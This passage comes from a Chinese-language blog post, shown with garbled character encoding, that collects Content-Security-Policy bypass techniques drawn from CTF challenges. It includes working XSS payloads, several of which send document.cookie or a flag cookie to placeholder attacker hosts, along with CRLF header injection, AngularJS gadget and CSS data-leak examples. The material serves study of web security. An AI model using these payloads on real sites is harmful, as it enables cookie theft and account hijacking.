class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">nonce</span>=<span class="string">'xxxxx'</span>&gt;</span></span><br><span class="line"><span class="actionscript">  <span class="comment">//do some thing</span></span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/KhjYkV" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/KhjYkV.md.png" alt="KhjYkV.md.png"></a></p>
<p>åœ¨æ²¡æœ‰pæ ‡ç­¾çš„æƒ…å†µä¸‹æˆ‘ä»¬çš„ç¡®å¯ä»¥xssï¼Œä¸è¿‡åŠ äº†pæ ‡ç­¾å°±ä¸é—­åˆäº†</p>
<p>ä¸è¿‡åœ¨æˆ‘ä»¬åœ¨scriptçš„typeä¸ºtext/javascriptçš„æƒ…å†µä¸‹æ˜¯å¯ä»¥xssçš„ï¼Œæœ‰ç‚¹ç¥å¥‡ï¼Œä¸è¿‡ä¾ç„¶åªæ˜¯å¯¹Firefoxæœ‰æ•ˆ</p>
<p>æµ‹è¯•ä»£ç </p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> header(<span class="string">"X-XSS-Protection:0"</span>);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;meta http-equiv=<span class="string">"Content-Security-Policy"</span> content=<span class="string">"default-src 'self'; script-src 'nonce-xxxxx'"</span>&gt;</span><br><span class="line">&lt;p&gt;<span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span>&lt;/p&gt;</span><br><span class="line">&lt;script type=<span class="string">"text/javascript"</span>  nonce=<span class="string">'xxxxx'</span>&gt;</span><br><span class="line">  <span class="comment">//do some thing</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/K4mJW4" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K4mJW4.md.png" alt="K4mJW4.md.png"></a></p>
<p><img src="https://s2.ax1x.com/2019/10/30/K4mrFO.png" alt="K4mrFO.png"></p>
<p>å¾ˆæ˜æ˜¾å¯ä»¥çœ‹å‡ºæ¥â€¦å’Œgoogleçš„è‡ªé—­å’Œä¸å¤ªä¸€æ ·</p>
<p>æ€è€ƒï¼šä¸ºä»€ä¹ˆå¤šäº†ä¸€ä¸ªpæ ‡ç­¾çš„è¯ï¼Œæœ¬æ¥çš„<code>&lt;script src=&quot;data:text/plain,alert(1)&quot; a=</code>å°±å¤±æ•ˆäº†</p>
<p>ä¸‹é¢æ˜¯ä¸€ç»„å¯¹æ¯”</p>
<p><a href="https://imgchr.com/i/K4f5QK" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K4f5QK.md.png" alt="K4f5QK.md.png"></a></p>
<p>å³å›¾å¯xssï¼Œå·¦å›¾æ— æ³•xssï¼Œä¸ªäººæ„Ÿè§‰æ˜¯å› ä¸ºaåé¢æ˜¯è‡ªåŠ¨æ·»åŠ çš„åŒå¼•å·ï¼Œè¿™ä¸ªåŒå¼•å·åªèƒ½å»è‡ªåŠ¨é—­åˆä¸€ä¸ªä¸å®Œæ•´çš„æ ‡ç­¾ï¼Œæ¯”å¦‚é—­åˆ<code>&lt;/p&gt;</code>ä¸­çš„&lt;/pï¼Œå’Œ&lt;scriptï¼Œä»¥åå¦‚æœæœ‰æ›´å¥½çš„ç ”ç©¶çš„è¯å¯ä»¥é‡æ–°æ¥çœ‹ä¸€ä¸‹è¿™ä¸ªé—®é¢˜ã€‚</p>
<p>å¯ä»¥çœ‹åˆ°åœ¨type=â€text/javascriptâ€çš„æƒ…å†µä¸‹ï¼Œå¦‚æœæˆ‘ä»¬ä¸è‡ªå·±æ·»åŠ åŒå¼•å·çš„æµè§ˆå™¨è‡ªæ·»åŠ æ•ˆæœä¸º</p>
<p><a href="https://imgchr.com/i/K44GNj" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K44GNj.md.png" alt="K44GNj.md.png"></a></p>
<p>è¿™ä¸ªçš„Bypassè¿˜æ˜¯ä¸»è¦é€šè¿‡è‡ªå·±æ·»åŠ ä¸€ä¸ªåŒå¼•å·ï¼Œæ¯”å¦‚a=â€ï¼Œæµè§ˆå™¨ç»™çš„é—­åˆå¯èƒ½ç›´æ¥æ˜¯<code>a=&quot;&lt;/p&gt;&lt;script&quot;</code>ï¼Œä¸è¿‡ç°åœ¨ä¸åœ¨type=â€text/javascriptâ€™â€™çš„æƒ…å†µä¸‹å»ä½¿ç”¨è¿™ä¸ªpayloadï¼Œç›´æ¥æŠ¥é”™äº†ã€‚</p>
<p><a href="https://imgchr.com/i/K444bD" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K444bD.md.png" alt="K444bD.md.png"></a></p>
<h4 id=""><a href="#" class="headerlink" title=""></a></h4><h4 id="é€šè¿‡æ–‡ä»¶ä¸Šä¼ Bypass-CSP"><a href="#é€šè¿‡æ–‡ä»¶ä¸Šä¼ Bypass-CSP" class="headerlink" title="é€šè¿‡æ–‡ä»¶ä¸Šä¼ Bypass CSP"></a>é€šè¿‡æ–‡ä»¶ä¸Šä¼ Bypass CSP</h4><p>æ¯”å¦‚cctf 2016</p>
<p>ä¸Šä¼ swfæ–‡ä»¶å¦‚ä¸‹</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">CWS</span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript"><span class="keyword">var</span> xml = <span class="keyword">new</span> XMLHttpRequest(); xml.open(<span class="string">'POST'</span>, <span class="string">'http://xss.xxxxx.cc'</span>, <span class="literal">true</span>); xml.setRequestHeader(<span class="string">"Content-type"</span>,<span class="string">"application/x-www-form-urlencoded"</span>); xml.send(<span class="string">'cookie='</span>+<span class="built_in">document</span>.cookie); </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>é€šè¿‡importå¼•å…¥ åŠ è½½</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">link</span> <span class="attr">rel</span>=<span class="string">'import'</span> <span class="attr">href</span>=<span class="string">'/upload/xxxxx'</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>åœ¨l3m0nå¸ˆå‚…çš„åšå®¢ä¸­çœ‹åˆ°ï¼Œå¦‚æœé‡åˆ°è¿™ç§æƒ…å†µï¼Œä¸Šä¼ åªèƒ½ä¸Šä¼ åˆ°uploadç›®å½•ï¼Œä½†æ˜¯cspé™åˆ¶åªèƒ½åœ¨staticç›®å½•ä¸‹åŠ è½½js</p>
<p>HITCON2016</p>
<p>payload å¦‚ä¸‹ï¼Œé€šè¿‡%2f bypass</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript src=<span class="string">"http://sguestbook.hctf.io/static/..%2fupload/a32642750cae25f4c5b020d9a66c5c5c"</span>&gt;&lt;<span class="regexp">/scscriptript&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä¸ªäººå¯¹è¿™ä¸ªpayloadçš„ç†è§£çš„è¯å°±æ˜¯å› ä¸º%2fåœ¨æœªè§£å—ä¹‹å‰æ˜¯å±äºstaticç›®å½•ä¸‹çš„èµ„æºï¼Œç»è¿‡srcçš„è°ƒç”¨ï¼Œ%2fè§£ç ä¸º/ï¼Œæœ€ç»ˆå®é™…è°ƒç”¨äº†uploadç›®å½•ä¸‹é¢çš„èµ„æºã€‚</p>
<p>è¿˜æœ‰æ¢…å­é…’å¸ˆå‚…çš„[<a href="https://meizjm3i.github.io/2018/05/12/Use%20Wave%20File%20Bypass%20CSP/]" target="_blank" rel="noopener">https://meizjm3i.github.io/2018/05/12/Use%20Wave%20File%20Bypass%20CSP/]</a>(<a href="https://meizjm3i.github.io/2018/05/12/Use" target="_blank" rel="noopener">https://meizjm3i.github.io/2018/05/12/Use</a> Wave File Bypass CSP/)</p>
<p>é€šè¿‡waveæ–‡ä»¶Bypass CSP</p>
<h4 id="302è·³è½¬Bypass-CSP"><a href="#302è·³è½¬Bypass-CSP" class="headerlink" title="302è·³è½¬Bypass CSP"></a>302è·³è½¬Bypass CSP</h4><p>CSPè§„åˆ™å¦‚ä¸‹</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:default-src 'self'; script-src http://sguestbook.hctf.io/static/ 'sha256-n+kMAVS5Xj7r/dvV9ZxAbEX6uEmK+uen+HZXbLhVsVA=' 'sha256-2zDCsAh4JN1o1lpARla6ieQ5KBrjrGpn0OAjeJ1V9kg=' 'sha256-SQQX1KpZM+ueZs+PyglurgqnV7jC8sJkUMsG9KkaFwQ=' 'sha256-JXk13NkH4FW9/ArNuoVR9yRcBH7qGllqf1g5RnJKUVg=' 'sha256-NL8WDWAX7GSifPUosXlt/TUI6H8JU0JlK7ACpDzRVUc=' 'sha256-CCZL85Vslsr/bWQYD45FX+dc7bTfBxfNmJtlmZYFxH4=' 'sha256-2Y8kG4IxBmLRnD13Ne2JV/V106nMhUqzbbVcOdxUH8I=' 'sha256-euY7jS9jMj42KXiApLBMYPZwZ6o97F7vcN8HjBFLOTQ=' 'sha256-V6Bq3u346wy1l0rOIp59A6RSX5gmAiSK40bp5JNrbnw='; font-src http://sguestbook.hctf.io/static/ fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'</span><br></pre></td></tr></table></figure>

<ul>
<li><p>script-srcåªå…è®¸åŠ è½½staticç›®å½•ä¸‹çš„jsï¼Œstaticä¸‹æœ‰ä¸€ä¸ªredirect.php</p>
<p>å†™ä¸€ä¸ªjsä¸Šä¼ ï¼Œé€šè¿‡302è·³è½¬Bypassæ‰CSP</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript src=<span class="string">"http://115.28.78.16:12222/static/redirect.php?u=/upload/cf4b03010ddaafec5933f656fad2692d"</span>&gt;&lt;<span class="regexp">/scriscriptpt&gt;</span></span><br></pre></td></tr></table></figure>

</li>
</ul>
<p>å½“ç„¶ï¼Œæˆ‘ä»¬ä¹‹å‰è¯´çš„é‚£ä¸ªpayloadä¹Ÿå¯ä»¥</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;scscriptript src=<span class="string">"http://sguestbook.hctf.io/static/..%2fupload/a32642750cae25f4c5b020d9a66c5c5c"</span>&gt;&lt;<span class="regexp">/scscriptript&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://www.freebuf.com/articles/web/121778.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/web/121778.html</a></p>
<h4 id="JSONP-Bypass-CSP"><a href="#JSONP-Bypass-CSP" class="headerlink" title="JSONP Bypass CSP"></a>JSONP Bypass CSP</h4><p><a href="https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere" target="_blank" rel="noopener">https://corb3nik.github.io/blog/ins-hack-2019/bypasses-everywhere</a></p>
<p>å¾ˆæœ‰è¶£çš„é¢˜ï¼Œçœ‹äº†ä¸€éæ„Ÿè§‰å­¦åˆ°äº†å¾ˆå¤š</p>
<p>é€šè¿‡ç¬¬ä¸€ä¸ªiframeçš„callbackï¼Œè°ƒç”¨çˆ¶çª—å£æ”¹å†™ç¬¬äºŒä¸ªiframeçš„å†…å®¹ï¼Œä»è€ŒåŠ è½½ç¬¬ä¸€ä¸ªä¸­documen.write,æœ€ç»ˆåŠ è½½äº†æˆ‘ä»¬vpsä¸Šçš„æ¶æ„æ–‡ä»¶</p>
<p>å› ä¸ºcspçš„ç™½åå•ä¸Šæœ‰Googleï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥é€šè¿‡å¯»æ‰¾googleä¸Šçš„jsonpçš„å›è°ƒå‡½æ•°ç‚¹é…åˆæ³¨é‡Šï¼Œæ‰§è¡Œä»»æ„js</p>
<h4 id="CDNå›è°ƒå‡½æ•°Bypass-CSP"><a href="#CDNå›è°ƒå‡½æ•°Bypass-CSP" class="headerlink" title="CDNå›è°ƒå‡½æ•°Bypass CSP"></a>CDNå›è°ƒå‡½æ•°Bypass CSP</h4><p>åœ¨å‰ç«¯å¼€å‘çš„æ—¶å€™ä¼šè°ƒç”¨è®¸å¤šå‰ç«¯çš„æ¡†æ¶å’Œåº“ï¼Œè€Œä¸ºäº†å‡å°‘æœåŠ¡å™¨ä¸Šé¢çš„å‹åŠ›æˆ–è€…å‡å°‘å ç”¨èµ„æºç­‰ï¼Œæœ‰æ—¶ä¼šå¼•å…¥å…¶ä»–cdnä¸Šçš„jsæ¡†æ¶ï¼Œå½“cdnä¸Šå­˜åœ¨ä¸€äº›ä½ç‰ˆæœ¬çš„æ¡†æ¶ï¼Œå³æœ‰å¯èƒ½å­˜åœ¨ç»•è¿‡cspçš„é£é™©</p>
<p>æ¯”å¦‚ <a href="https://paper.seebug.org/855/" target="_blank" rel="noopener">https://paper.seebug.org/855/</a></p>
<p>hackmeçš„CSPå¼•ç”¨cloudflare.com CDNæœåŠ¡ï¼Œäºæ˜¯è¿™ç¯‡æ–‡ç« çš„ä½œè€…Orangeå¸ˆå‚…ï¼ˆtql)é‡‡å–å¼•ç”¨ä½ç‰ˆæœ¬çš„angular jsæ¨¡æ¿æ³¨å…¥æ¥ç»•è¿‡CSP</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self'; script-src 'unsafe-eval' https://cdnjs.cloudflare.com;"</span>&gt;</span></span><br><span class="line"><span class="comment">&lt;!-- foo="--&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">https://cdnjs.cloudflare.com/ajax/libs/angular.js/1.0.8/angular.min.js</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">ng-app</span>&gt;</span></span><br><span class="line">    &#123;&#123;constructor.constructor('alert(document.cookie)')()&#125;&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/K5FiWR" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/30/K5FiWR.md.png" alt="K5FiWR.md.png"></a></p>
<p>evoAå¸ˆå‚…ä¸­åšå®¢åˆ—å‡ºå‡ºæ¥çš„<a href="https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76ï¼ˆå­˜åœ¨ä½ç‰ˆæœ¬angular" target="_blank" rel="noopener">https://github.com/google/csp-evaluator/blob/master/whitelist_bypasses/angular.js#L26-L76ï¼ˆå­˜åœ¨ä½ç‰ˆæœ¬angular</a> jsçš„cdnæœåŠ¡å•†åˆ—è¡¨ï¼‰</p>
<h4 id="é€šè¿‡åŠ è½½jsåº“Bypass-CSP"><a href="#é€šè¿‡åŠ è½½jsåº“Bypass-CSP" class="headerlink" title="é€šè¿‡åŠ è½½jsåº“Bypass CSP"></a>é€šè¿‡åŠ è½½jsåº“Bypass CSP</h4><p>å¦‚æœç”¨äº†Jquery-mobileåº“ï¼Œä¸”CSPä¸­åŒ…å«â€script-src â€˜unsafe-evalâ€™â€æˆ–è€…â€script-src â€˜strict-dynamicâ€™â€</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span> <span class="attr">data-role</span>=<span class="string">popup</span> <span class="attr">id</span>=<span class="string">'&lt;script&gt;alert(1)&lt;/script&gt;'</span>&gt;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>RCTF2018çš„ AMPåº“ï¼Œé€šè¿‡å¦‚ä¸‹payloadè·å¾—åå­—ä¸ºflagçš„cookie</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">amp-pixel</span> <span class="attr">src</span>=<span class="string">"http://your domain/?cid=CLIENT_ID(FLAG)"</span>&gt;</span><span class="tag">&lt;/<span class="name">amp-pixel</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>å¸¸è¢«ç”¨æ¥ç»•è¿‡CSPçš„jsåº“ï¼š</p>
<p><a href="https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf" target="_blank" rel="noopener">https://www.blackhat.com/docs/us-17/thursday/us-17-Lekies-Dont-Trust-The-DOM-Bypassing-XSS-Mitigations-Via-Script-Gadgets.pdf</a></p>
<h4 id="urlè·³è½¬Bypass-CSP"><a href="#urlè·³è½¬Bypass-CSP" class="headerlink" title="urlè·³è½¬Bypass CSP"></a>urlè·³è½¬Bypass CSP</h4><p>åœ¨script-srcå…è®¸unsafe-inlineçš„æƒ…å†µä¸‹ï¼ŒCSPå¦‚ä¸‹</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Content-Security-Policy:default-src 'self'; script-src 'self' 'unsafe-inline'; font-src 'self' fonts.gstatic.com; style-src 'self' 'unsafe-inline'; img-src 'self'</span><br></pre></td></tr></table></figure>

<p>å¯ä»¥é€šè¿‡window.location,document.location,location.hrefè¿›è¡Œè·³è½¬Bypas</p>
<p>(img-srcä¸é™åˆ¶çš„æƒ…å†µä¸‹)åŒæ—¶è¿˜å¯ä»¥é€šè¿‡imgæ ‡ç­¾çš„srcå±æ€§æ‰“xss</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> i = <span class="built_in">document</span>.createElement(<span class="string">'img'</span>);</span><br><span class="line">i.src = <span class="string">'http://xxx.com'</span> + <span class="built_in">document</span>.cookie;</span><br><span class="line"><span class="built_in">document</span>.body.appendChild(i);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>ä»decadeå¸ˆå‚…é‚£é‡Œçœ‹åˆ°æœ‰ä¸€ä¸ªBypass <code>.</code>çš„æ“ä½œï¼Œå­¦ä¹ äº†</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> i = <span class="built_in">document</span>[<span class="string">'createElement'</span>](<span class="string">'img'</span>);</span><br><span class="line">i[<span class="string">'src'</span>] = <span class="built_in">String</span>[<span class="string">'fromCharCode'</span>](http:<span class="comment">//xxx.com æ‰€å¯¹åº”çš„ Ascii ç ï¼Œç”¨é€—å·åˆ†éš”) + document['cookie'];</span></span><br><span class="line"><span class="built_in">document</span>[<span class="string">'body'</span>][<span class="string">'appendChild'</span>](i);</span><br><span class="line">&lt;<span class="regexp">/script&gt;</span></span><br></pre></td></tr></table></figure>

<p>åŒç†iframe a audioç­‰æ ‡ç­¾çš„srcä¹Ÿéƒ½å¯ä»¥ä½¿ç”¨</p>
<h4 id="é€šè¿‡CRLF-Bypass-CSP"><a href="#é€šè¿‡CRLF-Bypass-CSP" class="headerlink" title="é€šè¿‡CRLF Bypass CSP"></a>é€šè¿‡CRLF Bypass CSP</h4><p><a href="https://github.com/Lou00/HCTF2018_Bottle" target="_blank" rel="noopener">https://github.com/Lou00/HCTF2018_Bottle</a></p>
<p>ä¸¤ä¸ªæœ‰æ„æ€çš„ç‚¹</p>
<ul>
<li>é¦–å…ˆæ˜¯åœ¨Firefoxæµè§ˆå™¨ä¸‹ç«¯å£å°äº80åˆ™ä¸ä¼šè·³è½¬</li>
<li>hearderä¸‹é¢ä¸¤ä¸ª%0a%0då°†CSPå†…å®¹æŒ¤åˆ°å“åº”çš„ä¸‹æ–¹ï¼Œç›´æ¥å¯¼è‡´CSPæ— æ•ˆ</li>
</ul>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;bottle.2018.hctf.io&#x2F;path?path&#x3D;http:&#x2F;&#x2F;bottle.2018.hctf.io:22&#x2F;%0d%0aContent-Length:%2065%0d%0a%0d%0a%3Cscript%20src&#x3D;http:&#x2F;&#x2F;youvps&#x2F;cookie.js%3E%3C&#x2F;script%3E</span><br><span class="line">####</span><br></pre></td></tr></table></figure>

<h4 id="SVG-Bypass-CSP"><a href="#SVG-Bypass-CSP" class="headerlink" title="SVG Bypass CSP"></a>SVG Bypass CSP</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8" standalone="no"?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">svg</span> <span class="meta-keyword">PUBLIC</span> <span class="meta-string">"-//W3C//DTD SVG 1.1//EN"</span> <span class="meta-string">"http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">version</span>=<span class="string">"1.1"</span> <span class="attr">id</span>=<span class="string">"Layer_1"</span> <span class="attr">xmlns</span>=<span class="string">"http://www.w3.org/2000/svg"</span> <span class="attr">xmlns:xlink</span>=<span class="string">"http://www.w3.org/1999/xlink"</span> <span class="attr">x</span>=<span class="string">"0px"</span> <span class="attr">y</span>=<span class="string">"0px"</span> <span class="attr">width</span>=<span class="string">"100px"</span> <span class="attr">height</span>=<span class="string">"100px"</span> <span class="attr">viewBox</span>=<span class="string">"0 0 751 751"</span> <span class="attr">enable-background</span>=<span class="string">"new 0 0 751 751"</span> <span class="attr">xml:space</span>=<span class="string">"preserve"</span>&gt;</span>  <span class="tag">&lt;<span class="name">image</span> <span class="attr">id</span>=<span class="string">"image0"</span> <span class="attr">width</span>=<span class="string">"751"</span> <span class="attr">height</span>=<span class="string">"751"</span> <span class="attr">x</span>=<span class="string">"0"</span> <span class="attr">y</span>=<span class="string">"0"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">href</span>=<span class="string">"data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAu8AAALvCAIAAABa4bwGAAAAIGNIUk0AAHomAACAhAAA+gAAAIDo"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span>alert(1)<span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>è®¿é—®svgæ–‡ä»¶å³å¯è§¦å‘xss</p>
<p>è¯¦è§  <a href="https://xz.aliyun.com/t/4492" target="_blank" rel="noopener">https://xz.aliyun.com/t/4492</a></p>
<h4 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h4><p><a href="https://lorexxar.cn/2016/11/30/hctf2016-xss/#secret-area" target="_blank" rel="noopener">https://lorexxar.cn/2016/11/30/hctf2016-xss/#secret-area</a></p>
<h4 id="é€šè¿‡CSSé€‰æ‹©å™¨è·å–å†…å®¹"><a href="#é€šè¿‡CSSé€‰æ‹©å™¨è·å–å†…å®¹" class="headerlink" title="é€šè¿‡CSSé€‰æ‹©å™¨è·å–å†…å®¹"></a>é€šè¿‡CSSé€‰æ‹©å™¨è·å–å†…å®¹</h4><p>æµ‹è¯•ä»£ç </p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"Content-Security-Policy"</span> <span class="attr">content</span>=<span class="string">"default-src 'self';script-src 'self'; style-src 'unsafe-inline';img-src *"</span>&gt;</span></span><br><span class="line"><span class="php"><span class="meta">&lt;?php</span> <span class="keyword">echo</span> $_GET[<span class="string">'xss'</span>]<span class="meta">?&gt;</span></span></span><br><span class="line"><span class="tag">&lt;<span class="name">input</span> <span class="attr">value</span>=<span class="string">"test"</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Payloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;problem&#x2F;css.php?xss&#x3D;&lt;style&gt;input[value^&#x3D;&quot;t&quot;] &#123;background-image:url(&quot;http:&#x2F;&#x2F;attack&#x2F;?t&quot;)&#125;&lt;&#x2F;style&gt;</span><br></pre></td></tr></table></figure>

<p><a href="https://imgchr.com/i/KIeQGF" target="_blank" rel="noopener"><img src="https://s2.ax1x.com/2019/10/31/KIeQGF.md.png" alt="KIeQGF.md.png"></a></p>
<p>éœ€è¦Styleå¯ä»¥å†…æ•›ï¼Œimgå¯ä»¥ä¸åŒæºï¼Œå¯æ–°å»ºæ ‡ç­¾ã€‚</p>
<h3 id="CSPçš„è¿›åŒ–ä»¥åŠBypass"><a href="#CSPçš„è¿›åŒ–ä»¥åŠBypass" class="headerlink" title="CSPçš„è¿›åŒ–ä»¥åŠBypass"></a>CSPçš„è¿›åŒ–ä»¥åŠBypass</h3><p>Googleå›¢é˜Ÿ2016å¹´åœ¨<a href="https://static.googleusercontent.com/media/research.google.com/en//pubs/archive/45542.pdf" target="_blank" rel="noopener">CSP is Dead, Long live CSP</a>ä¸­æ­£å¼æå‡ºçš„CSPç§ç±»ï¼Œä¸ºäº†è§£å†³CSPçˆ†å‡ºçš„å„ç§å„æ ·çš„é—®é¢˜ã€‚</p>
<h3 id="nonce-script-CSP"><a href="#nonce-script-CSP" class="headerlink" title="nonce script CSP"></a>nonce script CSP</h3><p>åŠ¨æ€ç”Ÿæˆnonceå­—ç¬¦ä¸²ï¼Œåªæœ‰åŒ…å«nonceå­—æ®µå¹¶å­—ç¬¦ä¸²ç›¸ç­‰çš„scriptå—å¯ä»¥è¢«æ‰§è¡Œ</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">Header(<span class="string">"Content-Security-Policy: script-src 'nonce-"</span>.$random.<span class="string">" '"</span>);<span class="meta">?&gt;</span></span><br><span class="line">&lt;script nonce=<span class="string">"&lt;?php echo $random?&gt;"</span>&gt;</span><br></pre></td></tr></table></figure>

<p>è¿™ä¸ªå­—ç¬¦ä¸²å¯ä»¥åœ¨åç«¯å®ç°ï¼Œæ¯æ¬¡è¯·æ±‚éƒ½é‡æ–°ç”Ÿæˆï¼Œè¿™æ ·å°±å¯ä»¥æ— è§†å“ªä¸ªåŸŸæ˜¯å¯ä¿¡çš„ï¼Œä¿è¯æ‰€åŠ è½½çš„ä»»ä½•èµ„æºéƒ½æ˜¯å¯ä¿¡çš„ï¼Œå¹¶ä¸”è¿˜èƒ½æ‹¦æˆªåé¢æ’å…¥çš„scriptã€‚</p>
<p>è¿™ä¸ªçš„Bypasså‰é¢åŠ ä¸¾äº†å‡ ä¸ªä¾‹å­ï¼Œåªä¸è¿‡æ¡ä»¶æ˜¯ç‰¹æ®Šçš„â€¦åº”è¯¥ä¹Ÿä¸èƒ½ç®—Bypassï¼Œemmä¹‹å‰çš„cssåœ¨åˆé€‚çš„æ¡ä»¶ä¸‹ä¹Ÿå¯ä»¥Bypass</p>
<p><a href="https://lorexxar.cn/2017/05/16/nonce-bypass-script/" target="_blank" rel="noopener">https://lorexxar.cn/2017/05/16/nonce-bypass-script/</a> åˆ©ç”¨æµè§ˆå™¨ç¼“å­˜Bypass CSP script nonce</p>
<h3 id="strict-dynamic"><a href="#strict-dynamic" class="headerlink" title="strict-dynamic"></a>strict-dynamic</h3><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">Content-Security-Policy</span>: default-src 'self'; script-src 'strict-dynamic'</span><br></pre></td></tr></table></figure>

<p>SDæ„å‘³ç€å¯ä¿¡jsç”Ÿæˆçš„jsä»£ç æ˜¯å¯ä¿¡çš„ã€‚</p>
